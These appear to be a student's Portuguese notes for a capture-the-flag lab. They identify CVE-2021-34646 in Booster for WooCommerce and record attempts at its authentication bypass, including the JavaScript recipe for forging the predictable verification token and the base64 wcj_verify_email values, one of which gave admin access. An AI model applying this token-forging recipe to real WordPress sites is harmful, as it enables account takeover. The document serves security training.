# Desafio 1

- 5.8.1 wordpress
- WooCommerce 5.7.1
- Booster for WooCommerce 5.4.3 - ESTE AQUI

Possiveis :
- CVE-2021-39203
- CVE-2022-21664
- CVE-2022-21661
- CVE-2021-34646 - melhor

flag{CVE-2021-34646} - CORRETO 

# Desafio 2

admin - user 1

Descrição sucinta da vulnerablidade:
>	O processo de validação do e-mail tem uma fraquesa quanto à geração do token para dar reset à password. Esse token é previsível.
Conseguimos assim fazer-nos passar por outro utilizador. O link abaixo explica o processo a fazer para obter esse token.

exploit: 
https://www.wordfence.com/blog/2021/08/critical-authentication-bypass-vulnerability-patched-in-booster-for-woocommerce/


TENTATIVAS DE CRIAR ATAQUE:::

1664838545 -- Tempo de envio do HTTP Request
var o = {id: 1, code: md5(1664838545)}; - 
var e = btoa(JSON.stringify(o))
wcj_verify_email="eyJpZCI6MSwiY29kZSI6IjI2ZjkxYWM1YjM5M2YyNmU3ZTM5Y2ZlODIwY2FhZjE3In0=" 
wcj_verify_email="eyJpZCI6MSwiY29kZSI6IjEzYzIwMWRmODMwYjk4ZjViNzdkNDAyMTk3MjI0N2E2In0="

Diferentes formas de meter no JSON deram problema, com string ? sem string nos parametos ?

eyJpZCI6MSwiY29kZSI6IjkxYjMxMDg4YmMyNzA3YTBlNzZmYTE2NDU5YzMwNjRhIn0= 
eyJpZCI6IjEiLCJjb2RlIjoiOTFiMzEwODhiYzI3MDdhMGU3NmZhMTY0NTljMzA2NGEifQ==

A PRIMEIRA DE CIMA RESULTOU
